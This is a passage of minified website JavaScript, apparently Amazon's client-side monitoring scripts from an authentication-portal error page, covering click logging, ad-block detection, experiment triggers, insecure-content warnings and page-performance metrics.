                            x = t();
                        w || !x ? u() : l();
                        a.ue_isAdb = v;
                        a.ue_isAdb.unk = "adblk_unk";
                        a.ue_isAdb.no = p;
                        a.ue_isAdb.yes = k
                    }
                }, "adb")(document, window);




                (function(c, l, m) {
                    function h(a) {
                        if (a) try {
                            if (a.id) return "//*[@id='" + a.id + "']";
                            var b, d = 1,
                                e;
                            for (e = a.previousSibling; e; e = e.previousSibling) e.nodeName === a.nodeName && (d += 1);
                            b = d;
                            var c = a.nodeName;
                            1 !== b && (c += "[" + b + "]");
                            a.parentNode && (c = h(a.parentNode) + "/" + c);
                            return c
                        } catch (f) {
                            return "DETACHED"
                        }
                    }

                    function f(a) {
                        if (a && a.getAttribute) return a.getAttribute(k) ? a.getAttribute(k) : f(a.parentElement)
                    }
                    var k = "data-cel-widget",
                        g = !1,
                        d = [];
                    (c.ue || {}).isBF = function() {
                        try {
                            var a = JSON.parse(localStorage["csm-bf"] || "[]"),
                                b = 0 <= a.indexOf(c.ue_id);
                            a.unshift(c.ue_id);
                            a = a.slice(0, 20);
                            localStorage["csm-bf"] = JSON.stringify(a);
                            return b
                        } catch (d) {
                            return !1
                        }
                    }();
                    c.ue_utils = {
                        getXPath: h,
                        getFirstAscendingWidget: function(a, b) {
                            c.ue_cel && c.ue_fem ? !0 === g ? b(f(a)) : d.push({
                                element: a,
                                callback: b
                            }) : b()
                        },
                        notifyWidgetsLabeled: function() {
                            if (!1 === g) {
                                g = !0;
                                for (var a = f, b = 0; b < d.length; b++)
                                    if (d[b].hasOwnProperty("callback") && d[b].hasOwnProperty("element")) {
                                        var c = d[b].callback,
                                            e = d[b].element;
                                        "function" === typeof c && "function" === typeof a && c(a(e))
                                    } d = null
                            }
                        },
                        extractStringValue: function(a) {
                            if ("string" ===
                                typeof a) return a
                        }
                    }
                })(ue_csm, window, document);





                ue_csm.ue_unrt = 1500;
                (function(d, b, t) {
                    function u(a, g) {
                        var c = a.srcElement || a.target || {},
                            b = {
                                k: v,
                                t: g.t,
                                dt: g.dt,
                                x: a.pageX,
                                y: a.pageY,
                                p: e.getXPath(c),
                                n: c.nodeName
                            };
                        a.button && (b.b = a.button);
                        c.type && (b.ty = c.type);
                        c.href && (b.r = e.extractStringValue(c.href));
                        c.id && (b.i = c.id);
                        c.className && c.className.split && (b.c = c.className.split(/\s+/));
                        h += 1;
                        e.getFirstAscendingWidget(c, function(a) {
                            b.wd = a;
                            d.ue.log(b, r)
                        })
                    }

                    function w(a) {
                        if (!x(a.srcElement || a.target)) {
                            m += 1;
                            n = !0;
                            var g = f = d.ue.d(),
                                c;
                            p && "function" === typeof p.now && a.timeStamp && (c = p.now() -
                                a.timeStamp, c = parseFloat(c.toFixed(2)));
                            s = b.setTimeout(function() {
                                u(a, {
                                    t: g,
                                    dt: c
                                })
                            }, y)
                        }
                    }

                    function z(a) {
                        if (a) {
                            var b = a.filter(A);
                            a.length !== b.length && (q = !0, k = d.ue.d(), n && q && (k && f && d.ue.log({
                                k: B,
                                t: f,
                                m: Math.abs(k - f)
                            }, r), l(), q = !1, k = 0))
                        }
                    }

                    function A(a) {
                        if (!a) return !1;
                        var b = "characterData" === a.type ? a.target.parentElement : a.target;
                        if (!b || !b.hasAttributes || !b.attributes) return !1;
                        var c = {
                                "class": "gw-clock gw-clock-aria s-item-container-height-auto feed-carousel using-mouse kfs-inner-container".split(" "),
                                id: ["dealClock",
                                    "deal_expiry_timer", "timer"
                                ],
                                role: ["timer"]
                            },
                            d = !1;
                        Object.keys(c).forEach(function(a) {
                            var e = b.attributes[a] ? b.attributes[a].value : "";
                            (c[a] || "").forEach(function(a) {
                                -1 !== e.indexOf(a) && (d = !0)
                            })
                        });
                        return d
                    }

                    function x(a) {
                        if (!a) return !1;
                        var b = (e.extractStringValue(a.nodeName) || "").toLowerCase(),
                            c = (e.extractStringValue(a.type) || "").toLowerCase(),
                            d = (e.extractStringValue(a.href) || "").toLowerCase();
                        a = (e.extractStringValue(a.id) || "").toLowerCase();
                        var f = "checkbox color date datetime-local email file month number password radio range reset search tel text time url week".split(" ");
                        if (-1 !== ["select", "textarea", "html"].indexOf(b) || "input" === b && -1 !== f.indexOf(c) || "a" === b && -1 !== d.indexOf("http") || -1 !== ["sitbreaderrightpageturner", "sitbreaderleftpageturner", "sitbreaderpagecontainer"].indexOf(a)) return !0
                    }

                    function l() {
                        n = !1;
                        f = 0;
                        b.clearTimeout(s)
                    }

                    function C() {
                        b.ue.onunload(function() {
                            ue.count("armored-cxguardrails.unresponsive-clicks.violations", h);
                            ue.count("armored-cxguardrails.unresponsive-clicks.violationRate", h / m * 100 || 0)
                        })
                    }
                    if (b.MutationObserver && b.addEventListener && Object.keys &&
                        d && d.ue && d.ue.log && d.ue_unrt && d.ue_utils) {
                        var y = d.ue_unrt,
                            r = "cel",
                            v = "unr_mcm",
                            B = "res_mcm",
                            p = b.performance,
                            e = d.ue_utils,
                            n = !1,
                            f = 0,
                            s = 0,
                            q = !1,
                            k = 0,
                            h = 0,
                            m = 0;
                        b.addEventListener && (b.addEventListener("mousedown", w, !0), b.addEventListener("beforeunload", l, !0), b.addEventListener("visibilitychange", l, !0), b.addEventListener("pagehide", l, !0));
                        b.ue && b.ue.event && b.ue.onSushiUnload && b.ue.onunload && C();
                        (new MutationObserver(z)).observe(t, {
                            childList: !0,
                            attributes: !0,
                            characterData: !0,
                            subtree: !0
                        })
                    }
                })(ue_csm, window, document);


                ue_csm.ue.exec(function(g, e) {
                    if (e.ue_err) {
                        var f = "";
                        e.ue_err.errorHandlers || (e.ue_err.errorHandlers = []);
                        e.ue_err.errorHandlers.push({
                            name: "fctx",
                            handler: function(a) {
                                if (!a.logLevel || "FATAL" === a.logLevel)
                                    if (f = g.getElementsByTagName("html")[0].innerHTML) {
                                        var b = f.indexOf("var ue_t0=ue_t0||+new Date();");
                                        if (-1 !== b) {
                                            var b = f.substr(0, b).split(String.fromCharCode(10)),
                                                d = Math.max(b.length - 10 - 1, 0),
                                                b = b.slice(d, b.length - 1);
                                            a.fcsmln = d + b.length + 1;
                                            a.cinfo = a.cinfo || {};
                                            for (var c = 0; c < b.length; c++) a.cinfo[d + c + 1 + ""] =
                                                b[c]
                                        }
                                        b = f.split(String.fromCharCode(10));
                                        a.cinfo = a.cinfo || {};
                                        if (!(a.f || void 0 === a.l || a.l in a.cinfo))
                                            for (c = +a.l - 1, d = Math.max(c - 5, 0), c = Math.min(c + 5, b.length - 1); d <= c; d++) a.cinfo[d + 1 + ""] = b[d]
                                    }
                            }
                        })
                    }
                }, "fatals-context")(document, window);


                (function(m, b) {
                    function c(k) {
                        function f(a) {
                            a && "string" === typeof a && (a = (a = a.match(/^(?:https?:)?\/\/(.*?)(\/|$)/i)) && 1 < a.length ? a[1] : null, a && a && ("number" === typeof e[a] ? e[a]++ : e[a] = 1))
                        }

                        function d(a) {
                            var e = 10,
                                d = +new Date;
                            a && a.timeRemaining ? e = a.timeRemaining() : a = {
                                timeRemaining: function() {
                                    return Math.max(0, e - (+new Date - d))
                                }
                            };
                            for (var c = b.performance.getEntries(), k = e; g < c.length && k > n;) c[g].name && f(c[g].name), g++, k = a.timeRemaining();
                            g >= c.length ? h(!0) : l()
                        }

                        function h(a) {
                            if (!a) {
                                a = m.scripts;
                                var c;
                                if (a)
                                    for (var d =
                                            0; d < a.length; d++)(c = a[d].getAttribute("src")) && "undefined" !== c && f(c)
                            }
                            0 < Object.keys(e).length && (p && ue_csm.ue && ue_csm.ue.event && (a = {
                                domains: e,
                                pageType: b.ue_pty || null,
                                subPageType: b.ue_spty || null,
                                pageTypeId: b.ue_pti || null
                            }, ue_csm.ue_sjslob && (a.lob = ue_csm.ue_lob || "0"), ue_csm.ue.event(a, "csm", "csm.CrossOriginDomains.2")), b.ue_ext = e)
                        }

                        function l() {
                            !0 === k ? d() : b.requestIdleCallback ? b.requestIdleCallback(d) : b.requestAnimationFrame ? b.requestAnimationFrame(d) : b.setTimeout(d, 100)
                        }

                        function c() {
                            if (b.performance &&
                                b.performance.getEntries) {
                                var a = b.performance.getEntries();
                                !a || 0 >= a.length ? h(!1) : l()
                            } else h(!1)
                        }
                        var e = b.ue_ext || {};
                        b.ue_ext || c();
                        return e
                    }

                    function q() {
                        setTimeout(c, r)
                    }
                    var s = b.ue_dserr || !1,
                        p = !0,
                        n = 1,
                        r = 2E3,
                        g = 0;
                    b.ue_err && s && (b.ue_err.errorHandlers || (b.ue_err.errorHandlers = []), b.ue_err.errorHandlers.push({
                        name: "ext",
                        handler: function(b) {
                            if (!b.logLevel || "FATAL" === b.logLevel) {
                                var f = c(!0),
                                    d = [],
                                    h;
                                for (h in f) {
                                    var f = h,
                                        g = f.match(/amazon(\.com?)?\.\w{2,3}$/i);
                                    g && 1 < g.length || -1 !== f.indexOf("amazon-adsystem.com") ||
                                        -1 !== f.indexOf("amazonpay.com") || -1 !== f.indexOf("cloudfront-labs.amazonaws.com") || d.push(h)
                                }
                                b.ext = d
                            }
                        }
                    }));
                    b.ue && b.ue.isl ? c() : b.ue && ue.attach && ue.attach("load", q)
                })(document, window);





                var ue_wtc_c = 3;
                ue_csm.ue.exec(function(b, e) {
                    function l() {
                        for (var a = 0; a < f.length; a++) a: for (var d = s.replace(A, f[a]) + g[f[a]] + t, c = arguments, b = 0; b < c.length; b++) try {
                            c[b].send(d);
                            break a
                        } catch (e) {}
                        g = {};
                        f = [];
                        n = 0;
                        k = p
                    }

                    function u() {
                        B ? l(q) : l(C, q)
                    }

                    function v(a, m, c) {
                        r++;
                        if (r > w) d.count && 1 == r - w && (d.count("WeblabTriggerThresholdReached", 1), b.ue_int && console.error("Number of max call reached. Data will no longer be send"));
                        else {
                            var h = c || {};
                            h && -1 < h.constructor.toString().indexOf(D) && a && -1 < a.constructor.toString().indexOf(x) && m && -1 <
                                m.constructor.toString().indexOf(x) ? (h = b.ue_id, c && c.rid && (h = c.rid), c = h, a = encodeURIComponent(",wl=" + a + "/" + m), 2E3 > a.length + p ? (2E3 < k + a.length && u(), void 0 === g[c] && (g[c] = "", f.push(c)), g[c] += a, k += a.length, n || (n = e.setTimeout(u, E))) : b.ue_int && console.error("Invalid API call. The input provided is over 2000 chars.")) : d.count && (d.count("WeblabTriggerImproperAPICall", 1), b.ue_int && console.error("Invalid API call. The input provided does not match the API protocol i.e ue.trigger(String, String, Object)."))
                        }
                    }

                    function F() {
                        d.trigger &&
                            d.trigger.isStub && d.trigger.replay(function(a) {
                                v.apply(this, a)
                            })
                    }

                    function y() {
                        z || (f.length && l(q), z = !0)
                    }
                    var t = ":1234",
                        s = "//" + b.ue_furl + "/1/remote-weblab-triggers/1/OE/" + b.ue_mid + ":" + b.ue_sid + ":PLCHLDR_RID$s:wl-client-id%3DCSMTriger",
                        A = "PLCHLDR_RID",
                        E = b.wtt || 1E4,
                        p = s.length + t.length,
                        w = b.mwtc || 2E3,
                        G = 1 === e.ue_wtc_c,
                        B = 3 === e.ue_wtc_c,
                        H = e.XMLHttpRequest && "withCredentials" in new e.XMLHttpRequest,
                        x = "String",
                        D = "Object",
                        d = b.ue,
                        g = {},
                        f = [],
                        k = p,
                        n, z = !1,
                        r = 0,
                        C = function() {
                            return {
                                send: function(a) {
                                    if (H) {
                                        var b = new e.XMLHttpRequest;
                                        b.open("GET", a, !0);
                                        G && (b.withCredentials = !0);
                                        b.send()
                                    } else throw "";
                                }
                            }
                        }(),
                        q = function() {
                            return {
                                send: function(a) {
                                    (new Image).src = a
                                }
                            }
                        }();
                    e.encodeURIComponent && (d.attach && (d.attach("beforeunload", y), d.attach("pagehide", y)), F(), d.trigger = v)
                }, "client-wbl-trg")(ue_csm, window);


                (function(k, d, h) {
                    function f(a, c, b) {
                        a && a.indexOf && 0 === a.indexOf("http") && 0 !== a.indexOf("https") && l(s, c, a, b)
                    }

                    function g(a, c, b) {
                        a && a.indexOf && (location.href.split("#")[0] != a && null !== a && "undefined" !== typeof a || l(t, c, a, b))
                    }

                    function l(a, c, b, e) {
                        m[b] || (e = u && e ? n(e) : "N/A", d.ueLogError && d.ueLogError({
                            message: a + c + " : " + b,
                            logLevel: v,
                            stack: "N/A"
                        }, {
                            attribution: e
                        }), m[b] = 1, p++)
                    }

                    function e(a, c) {
                        if (a && c)
                            for (var b = 0; b < a.length; b++) try {
                                c(a[b])
                            } catch (d) {}
                    }

                    function q() {
                        return d.performance && d.performance.getEntriesByType ?
                            d.performance.getEntriesByType("resource") : []
                    }

                    function n(a) {
                        if (a.id) return "//*[@id='" + a.id + "']";
                        var c;
                        c = 1;
                        var b;
                        for (b = a.previousSibling; b; b = b.previousSibling) b.nodeName == a.nodeName && (c += 1);
                        b = a.nodeName;
                        1 != c && (b += "[" + c + "]");
                        a.parentNode && (b = n(a.parentNode) + "/" + b);
                        return b
                    }

                    function w() {
                        var a = h.images;
                        a && a.length && e(a, function(a) {
                            var b = a.getAttribute("src");
                            f(b, "img", a);
                            g(b, "img", a)
                        })
                    }

                    function x() {
                        var a = h.scripts;
                        a && a.length && e(a, function(a) {
                            var b = a.getAttribute("src");
                            f(b, "script", a);
                            g(b, "script", a)
                        })
                    }

                    function y() {
                        var a = h.styleSheets;
                        a && a.length && e(a, function(a) {
                            if (a = a.ownerNode) {
                                var b = a.getAttribute("href");
                                f(b, "style", a);
                                g(b, "style", a)
                            }
                        })
                    }

                    function z() {
                        if (A) {
                            var a = q();
                            e(a, function(a) {
                                f(a.name, a.initiatorType)
                            })
                        }
                    }

                    function B() {
                        e(q(), function(a) {
                            g(a.name, a.initiatorType)
                        })
                    }

                    function r() {
                        var a;
                        a = d.location && d.location.protocol ? d.location.protocol : void 0;
                        "https:" == a && (z(), w(), x(), y(), B(), p < C && setTimeout(r, D))
                    }
                    var s = "[CSM] Insecure content detected ",
                        t = "[CSM] Ajax request to same page detected ",
                        v = "WARN",
                        m = {},
                        p = 0,
                        D = k.ue_nsip || 1E3,
                        C = 5,
                        A = 1 == k.ue_urt,
                        u = !0;
                    ue_csm.ue_disableNonSecure || (d.performance && d.performance.setResourceTimingBufferSize && d.performance.setResourceTimingBufferSize(300), r())
                })(ue_csm, window, document);


                var ue_aa_a = "";
                if (ue.trigger && (ue_aa_a === "C" || ue_aa_a === "T1")) {
                    ue.trigger("UEDATA_AA_SERVERSIDE_ASSIGNMENT_CLIENTSIDE_TRIGGER_190249", ue_aa_a);
                }
                (function(f, b) {
                    function g() {
                        try {
                            b.PerformanceObserver && "function" === typeof b.PerformanceObserver && (a = new b.PerformanceObserver(function(b) {
                                c(b.getEntries())
                            }), a.observe(d))
                        } catch (h) {
                            k()
                        }
                    }

                    function m() {
                        for (var h = d.entryTypes, a = 0; a < h.length; a++) c(b.performance.getEntriesByType(h[a]))
                    }

                    function c(a) {
                        if (a && Array.isArray(a)) {
                            for (var c = 0, e = 0; e < a.length; e++) {
                                var d = l.indexOf(a[e].name);
                                if (-1 !== d) {
                                    var g = Math.round(b.performance.timing.navigationStart + a[e].startTime);
                                    f.uet(n[d], void 0, void 0, g);
                                    c++
                                }
                            }
                            l.length ===
                                c && k()
                        }
                    }

                    function k() {
                        a && a.disconnect && "function" === typeof a.disconnect && a.disconnect()
                    }
                    if ("function" === typeof f.uet && b.performance && "object" === typeof b.performance && b.performance.getEntriesByType && "function" === typeof b.performance.getEntriesByType && b.performance.timing && "object" === typeof b.performance.timing && "number" === typeof b.performance.timing.navigationStart) {
                        var d = {
                                entryTypes: ["paint"]
                            },
                            l = ["first-paint", "first-contentful-paint"],
                            n = ["fp", "fcp"],
                            a;
                        try {
                            m(), g()
                        } catch (p) {
                            f.ueLogError(p, {
                                logLevel: "ERROR",
                                attribution: "performanceMetrics"
                            })
                        }
                    }
                })(ue_csm, window);


                if (window.csa) {
                    csa("Events")("setEntity", {
                        page: {
                            pageType: "AuthenticationPortal",
                            subPageType: "Error404Page",
                            pageTypeId: ""
                        }
                    });
                }
                csa.plugin(function(c) {
                    var m = "transitionStart",
                        n = "pageVisible",
                        e = "PageTiming",
                        t = "visibilitychange",
                        s = "$latency.visible",
                        i = c.global,
                        r = (i.performance || {}).timing,
                        a = ["navigationStart", "unloadEventStart", "unloadEventEnd", "redirectStart", "redirectEnd", "fetchStart", "domainLookupStart", "domainLookupEnd", "connectStart", "connectEnd", "secureConnectionStart", "requestStart", "responseStart", "responseEnd", "domLoading", "domInteractive", "domContentLoadedEventStart", "domContentLoadedEventEnd", "domComplete", "loadEventStart", "loadEventEnd"],
                        u = c.config,
                        o = i.Math,
                        l = o.max,
                        g = o.floor,
                        d = i.document || {},
                        f = (r || {}).navigationStart,
                        v = f,
                        p = 0,
                        S = null;
                    if (i.Object.keys && [].forEach && !u["KillSwitch." + e]) {
                        if (!r || null === f || f <= 0 || void 0 === f) return c.error("Invalid navigation timing data: " + f);
                        S = new E({
                            schemaId: "<ns>.PageLatency.6",
                            producerId: "csa"
                        }), "boolean" != typeof d.hidden && "string" != typeof d.visibilityState || !d.removeEventListener ? c.emit(s) : b() ? (c.emit(s), I(n, f)) : c.on(d, t, function e() {
                            b() && (v = c.time(), d.removeEventListener(t, e), I(m, v), I(n, v), c.emit(s))
                        }), c.once("$unload", h), c.once("$load", h), c.on("$pageTransition", function() {
                            v = c.time()
                        }), c.register(e, {
                            mark: I,
                            instance: function(e) {
                                return new E(e)
                            }
                        })
                    }

                    function E(e) {
                        var i, r = null,
                            a = e.ent || {
                                page: ["pageType", "subPageType", "requestId"]
                            },
                            o = e.logger || c("Events", {
                                producerId: e.producerId,
                                lob: u.lob || "0"
                            });
                        if (!e || !e.producerId || !e.schemaId) return c.error("The producer id and schema Id must be defined for PageLatencyInstance.");

                        function d() {
                            return i || v
                        }

                        function n() {
                            r = c.UUID()
                        }
                        this.mark = function(n, t) {
                            if (null != n) return t = t || c.time(), n === m && (i = t), c.once(s, function() {
                                o("log", {
                                    messageId: r,
                                    __merge: function(e) {
                                        e.markers[n] = function(e, n) {
                                            return l(0, n - (e || v))
                                        }(d(), t), e.markerTimestamps[n] = g(t)
                                    },
                                    markers: {},
                                    markerTimestamps: {},
                                    navigationStartTimestamp: d() ? new Date(d()).toISOString() : null,
                                    schemaId: e.schemaId
                                }, {
                                    ent: a
                                })
                            }), t
                        }, n(), c.on("$beforePageTransition", n)
                    }

                    function I(e, n) {
                        e === m && (v = n);
                        var t = S.mark(e, n);
                        c.emit("$timing:" + e, t)
                    }

                    function h() {
                        if (!p) {
                            for (var e = 0; e < a.length; e++) r[a[e]] && I(a[e], r[a[e]]);
                            p = 1
                        }
                    }

                    function b() {
                        return !d.hidden || "visible" === d.visibilityState
                    }
                });
                csa.plugin(function(u) {
                    var f, c, l = "length",
                        a = "parentElement",
                        t = "target",
                        i = "getEntriesByName",
                        e = "perf",
                        n = null,
                        r = "_csa_flt",
                        o = "_csa_llt",
                        s = "previousSibling",
                        d = "visuallyLoaded",
                        g = "client",
                        h = "offset",
                        m = "scroll",
                        p = "Width",
                        v = "Height",
                        y = g + p,
                        E = g + v,
                        S = h + p,
                        b = h + v,
                        x = m + p,
                        O = m + v,
                        _ = "_osrc",
                        w = "_elt",
                        L = "_eid",
                        T = 10,
                        I = 5,
                        N = 15,
                        k = 100,
                        B = u.global,
                        H = u.timeout,
                        W = B.Math,
                        Y = W.max,
                        C = W.floor,
                        F = W.ceil,
                        M = B.document || {},
                        R = M.body || {},
                        V = M.documentElement || {},
                        $ = B.performance || {},
                        P = ($.timing || {}).navigationStart,
                        X = Date.now,
                        D = Object.values || (u.types || {}).ovl,
                        J = u("PageTiming"),
                        j = u("SpeedIndexBuffers"),
                        q = [],
                        Q = [],
                        U = [],
                        z = [],
                        A = [],
                        G = [],
                        K = .1,
                        Z = .1,
                        ee = 0,
                        ne = 0,
                        te = !0,
                        ie = 0,
                        re = 0,
                        oe = 1 == u.config["SpeedIndex.ForceReplay"],
                        ae = 0,
                        fe = 1,
                        ue = 0,
                        ce = {},
                        le = [],
                        se = 0,
                        de = {
                            buffered: 1
                        };

                    function ge(e) {
                        u.global.ue_csa_ss_tag || u.emit("$csmTag:" + e, 0, de)
                    }

                    function he() {
                        for (var e = X(), n = 0; f;) {
                            if (0 !== f[l]) {
                                if (!1 !== f.h(f[0]) && f.shift(), n++, !oe && n % T == 0 && X() - e > I) break
                            } else f = f.n
                        }
                        ee = 0, f && (ee || (!0 === M.hidden ? (oe = 1, he()) : u.timeout(he, 0)))
                    }

                    function me(e, n, t, i, r) {
                        ue = C(e), q = n, Q = t, U = i, G = r;
                        var o = M.createTreeWalker(M.body, NodeFilter.SHOW_TEXT, null, null),
                            a = {
                                w: B.innerWidth,
                                h: B.innerHeight,
                                x: B.pageXOffset,
                                y: B.pageYOffset
                            };
                        M.body[w] = e, z.push({
                            w: o,
                            vp: a
                        }), A.push({
                            img: M.images,
                            iter: 0
                        }), q.h = pe, (q.n = Q).h = ve, (Q.n = U).h = ye, (U.n = z).h = Ee, (z.n = A).h = Se, (A.n = G).h = be, f = q, he()
                    }

                    function pe(e) {
                        e.m.forEach(function(e) {
                            for (var n = e; n && (e === n || !n[r] || !n[o]);) n[r] || (n[r] = e[r]), n[o] || (n[o] = e[o]), n[w] = n[r] - P, n = n[s]
                        })
                    }

                    function ve(e) {
                        e.m.forEach(function(e) {
                            var n = e[t];
                            _ in n || (n[_] = e.oldValue)
                        })
                    }

                    function ye(n) {
                        n.m.forEach(function(e) {
                            e[t][w] = n.t - P
                        })
                    }

                    function Ee(e) {
                        for (var n, t = e.vp, i = e.w, r = T;
                            (n = i.nextNode()) && 0 < r;) {
                            r -= 1;
                            var o = (n[a] || {}).nodeName;
                            "SCRIPT" !== o && "STYLE" !== o && "NOSCRIPT" !== o && "BODY" !== o && 0 !== (n.nodeValue || "").trim()[l] && Le(n[a], xe(n), t)
                        }
                        return !n
                    }

                    function Se(e) {
                        for (var n = {
                                w: B.innerWidth,
                                h: B.innerHeight,
                                x: B.pageXOffset,
                                y: B.pageYOffset
                            }, t = T; e.iter < e.img[l] && 0 < t;) {
                            var i, r = e.img[e.iter],
                                o = we(r),
                                a = o && xe(o) || xe(r);
                            o ? (o[w] = a, i = _e(o.querySelector('[aria-posinset="1"] img') || r) || a, r = o) : i = _e(r) || a, re && c < i && (i = a), Le(r, i, n), e.iter += 1, t -= 1
                        }
                        return e.img[l] <= e.iter
                    }

                    function be(e) {
                        var n = [],
                            i = 0,
                            r = 0,
                            o = ne,
                            t = B.innerHeight || Y(R[O] || 0, R[b] || 0, V[E] || 0, V[O] || 0, V[b] || 0),
                            a = C(e.y / k),
                            f = F((e.y + t) / k);
                        le.slice(a, f).forEach(function(e) {
                            (e.elems || []).forEach(function(e) {
                                e.lt in n || (n[e.lt] = {}), e.id in n[e.lt] || (i += (n[e.lt][e.id] = e).a)
                            })
                        }), ge("startVL"), D(n).forEach(function(e) {
                            D(e).forEach(function(e) {
                                var n = 1 - r / i,
                                    t = Y(e.lt, o);
                                se += n * (t - o), o = t,
                                    function(e, n) {
                                        var t;
                                        for (; K <= 1 && K - .01 <= e;) Te(d + (t = (100 * K).toFixed(0)), n.lt), "50" !== t && "90" !== t || u("Content", {
                                            target: n.e
                                        })("mark", d + t, P + F(n.lt || 0)), K += Z
                                    }((r += e.a) / i, e)
                            })
                        }), ge("endVL"), ne = e.t - P, G[l] <= 1 && (Te("speedIndex", se), Te(d + "0", ue)), te && (te = !1, Te("atfSpeedIndex", se))
                    }

                    function xe(e) {
                        for (var n = e[a], t = N; n && 0 < t;) {
                            if (n[w] || 0 === n[w]) return Y(n[w], ue);
                            n = n.parentElement, t -= 1
                        }
                    }

                    function Oe(e, n) {
                        if (e) {
                            if (!e.indexOf("data:")) return xe(n);
                            var t = $[i](e) || [];
                            if (0 < t[l]) return Y(F(t[0].responseEnd || 0), ue)
                        }
                    }

                    function _e(e) {
                        return Oe(e[_], e) || Oe(e.currentSrc, e) || Oe(e.src, e)
                    }

                    function we(e) {
                        for (var n = 10, t = e.parentElement; t && 0 < n;) {
                            if (t.classList && t.classList.contains("a-carousel-viewport")) return t;
                            t = t.parentElement, n -= 1
                        }
                        return null
                    }

                    function Le(e, n, t) {
                        if ((n || 0 === n) && !e[L]) {
                            var i = e.getBoundingClientRect(),
                                r = i.width * i.height,
                                o = t.w || Y(R[x] || 0, R[S] || 0, V[y] || 0, V[x] || 0, V[S] || 0) || i.right,
                                a = i.width / 2,
                                f = fe++;
                            if (0 != r && !(a < i.right - o || i.right < a)) {
                                for (var u = {
                                        e: e,
                                        lt: n,
                                        a: r,
                                        id: f
                                    }, c = C((i.top + t.y) / k), l = F((i.top + t.y + i.height) / k), s = c; s <= l; s++) s in le || (le[s] = {
                                    elems: [],
                                    lt: 0
                                }), le[s].elems.push(u);
                                e[L] = f
                            }
                        }
                    }

                    function Te(e, n) {
                        J("mark", e, P + F((ce[e] = n) || 0))
                    }

                    function Ie(e) {
                        ae || (ge("browserQuite" + e), j("getBuffers", me), ae = 1)
                    }
                    P && D && $[i] ? (ge(e + "Yes"), j("registerListener", function() {
                        re && (clearTimeout(ie), ie = H(Ie.bind(n, "Mut"), 2500))
                    }), u.once("$unload", function() {
                        oe = 1, Ie("Ud")
                    }), u.once("$load", function() {
                        re = 1, c = X() - P, ie = H(Ie.bind(n, "Ld"), 2500)
                    }), u.once("$timing:functional", Ie.bind(n, "Fn")), j("replayModuleIsLive"), u.register("SpeedIndex", {
                        getMarkers: function(e) {
                            e && e(JSON.parse(JSON.stringify(ce)))
                        }
                    })) : ge(e + "No")
                });
                csa.plugin(function(e) {
                    var m = !!e.config["LCP.elementDedup"],
                        t = !1,
                        n = e("PageTiming"),
                        r = e.global.PerformanceObserver,
                        a = e.global.performance;

                    function i() {
                        return a.timing.navigationStart
                    }

                    function o() {
                        t || function(o) {
                            var l = new r(function(e) {
                                var t = e.getEntries();
                                if (0 !== t.length) {
                                    var n = t[t.length - 1];
                                    if (m && "" !== n.id && n.element && "IMG" === n.element.tagName) {
                                        for (var r = {}, a = t[0], i = 0; i < t.length; i++) t[i].id in r || ("" !== t[i].id && (r[t[i].id] = !0), a.startTime < t[i].startTime && (a = t[i]));
                                        n = a
                                    }
                                    l.disconnect(), o({
                                        startTime: n.startTime,
                                        renderTime: n.renderTime,
                                        loadTime: n.loadTime
                                    })
                                }
                            });
                            try {
                                l.observe({
                                    type: "largest-contentful-paint",
                                    buffered: !0
                                })
                            } catch (e) {}
                        }(function(e) {
                            e && (t = !0, n("mark", "largestContentfulPaint", Math.floor(e.startTime + i())), e.renderTime && n("mark", "largestContentfulPaint.render", Math.floor(e.renderTime + i())), e.loadTime && n("mark", "largestContentfulPaint.load", Math.floor(e.loadTime + i())))
                        })
                    }
                    r && a && a.timing && (e.once("$unload", o), e.once("$load", o), e.register("LargestContentfulPaint", {}))
                });
                csa.plugin(function(r) {
                    var e = r("Metrics", {
                            producerId: "csa"
                        }),
                        n = r.global.PerformanceObserver;
                    n && (n = new n(function(r) {
                        var t = r.getEntries();
                        if (0 === t.length || !t[0].processingStart || !t[0].startTime) return;
                        ! function(r) {
                            r = r || 0, n.disconnect(), 0 <= r ? e("recordMetric", "firstInputDelay", r) : e("recordMetric", "firstInputDelay.invalid", 1)
                        }(t[0].processingStart - t[0].startTime)
                    }), function() {
                        try {
                            n.observe({
                                type: "first-input",
                                buffered: !0
                            })
                        } catch (r) {}
                    }())
                });
                csa.plugin(function(d) {
                    var e = "Metrics",
                        g = d.config,
                        f = 0;

                    function r(i) {
                        var c, t, e = i.producerId,
                            r = i.logger,
                            o = r || d("Events", {
                                producerId: e,
                                lob: g.lob || "0"
                            }),
                            s = (i || {}).dimensions || {},
                            u = {},
                            n = -1;
                        if (!e && !r) return d.error("Either a producer id or custom logger must be defined");

                        function a() {
                            n !== f && (c = d.UUID(), t = d.UUID(), u = {}, n = f)
                        }
                        this.recordMetric = function(r, n) {
                            var e = i.logOptions || {
                                ent: {
                                    page: ["pageType", "subPageType", "requestId"]
                                }
                            };
                            e.debugMetric = i.debugMetric, a(), o("log", {
                                messageId: c,
                                schemaId: i.schemaId || "<ns>.Metric.4",
                                metrics: {},
                                dimensions: s,
                                __merge: function(e) {
                                    e.metrics[r] = n
                                }
                            }, e)
                        }, this.recordCounter = function(r, e) {
                            var n = i.logOptions || {
                                ent: {
                                    page: ["pageType", "subPageType", "requestId"]
                                }
                            };
                            if ("string" != typeof r || "number" != typeof e || !isFinite(e)) return d.error("Invalid type given for counter name or counter value: " + r + "/" + e);
                            a(), r in u || (u[r] = {});
                            var c = u[r];
                            "f" in c || (c.f = e), c.c = (c.c || 0) + 1, c.s = (c.s || 0) + e, c.l = e, o("log", {
                                messageId: t,
                                schemaId: i.schemaId || "<ns>.InternalCounters.3",
                                c: {},
                                __merge: function(e) {
                                    r in e.c || (e.c[r] = {}), c.fs || (c.fs = 1, e.c[r].f = c.f), 1 < c.c && (e.c[r].s = c.s, e.c[r].l = c.l, e.c[r].c = c.c)
                                }
                            }, n)
                        }
                    }
                    g["KillSwitch." + e] || (new r({
                        producerId: "csa"
                    }).recordMetric("baselineMetricEvent", 1), d.on("$beforePageTransition", function() {
                        f++
                    }), d.register(e, {
                        instance: function(e) {
                            return new r(e || {})
                        }
                    }))
                });
                csa.plugin(function(t) {
                    var a, n = t.config,
                        r = (t.global.performance || {}).timing,
                        s = (r || {}).navigationStart || t.time();

                    function e() {
                        a = t.UUID()
                    }

                    function i(i) {
                        var r = (i = i || {}).producerId,
                            e = i.logger,
                            o = e || t("Events", {
                                producerId: r,
                                lob: n.lob || "0"
                            });
                        if (!r && !e) return t.error("Either a producer id or custom logger must be defined");
                        this.mark = function(e, r) {
                            var n = (void 0 === r ? t.time() : r) - s;
                            o("log", {
                                messageId: a,
                                schemaId: i.schemaId || "<ns>.Timer.1",
                                markers: {},
                                __merge: function(r) {
